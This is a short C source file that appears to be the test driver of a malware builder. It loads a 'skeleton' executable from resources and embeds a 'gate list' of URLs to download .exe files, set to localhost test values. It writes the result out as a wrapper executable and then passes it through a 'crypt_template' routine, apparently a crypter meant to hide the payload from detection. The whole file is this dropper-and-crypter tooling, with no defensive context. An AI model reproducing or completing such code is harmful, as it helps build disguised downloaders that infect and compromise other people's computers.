#include "wrap_gen.h"

#define WEBDAV_LIST_TEST		"http://127.0.0.1/a.exe|http://127.0.0.1/c.exe"

CHAR		gatelist_tmp[] = WEBDAV_LIST_TEST;

INT main(INT argc, PCHAR argv[])
{
	ERROR_CODE						status;

	HRSRC							resource;
	HGLOBAL							global;

	PDWORD							skel;
	UINT							skel_size;

	PDWORD							pe;
	UINT							pe_size;

	// Parameters


	resource			= FindResourceW(GetModuleHandle(NULL), MAKEINTRESOURCEW(IDR_SKELETON1), L"SKELETON");
	global				= LoadResource(GetModuleHandle(NULL), resource);
	LockResource(global);

	skel_size			= (UINT)SizeofResource(GetModuleHandle(NULL), resource);
	skel				= (PDWORD)HeapAlloc(GetProcessHeap(), 0, skel_size);
	ZeroMemory(skel, skel_size);
	CopyMemory((PVOID)skel, (PVOID)global, skel_size);

	generate_template((LPCSTR)gatelist_tmp, (PDWORD)skel, skel_size, 666, 777, &pe, &pe_size);

	HeapFree(GetProcessHeap(), 0, skel);
	UnlockResource(global);
	FreeResource(global);

	status = write_raw_to_disk("..\\Debug\\wrapper_skeleton.exe", pe, pe_size);
	if (!status) {
		printf("[!] Error in writing template\n");
		return 0;
	}

	// Run KPCOE on the skeleton
	status = crypt_template("..\\Debug\\wrapper_skeleton.exe", "..\\Debug\\crypted_template.exe");
	if (!status) {
		printf("[!] Error in writing crypted file\n");
		return 0;
	}

	return 0;
}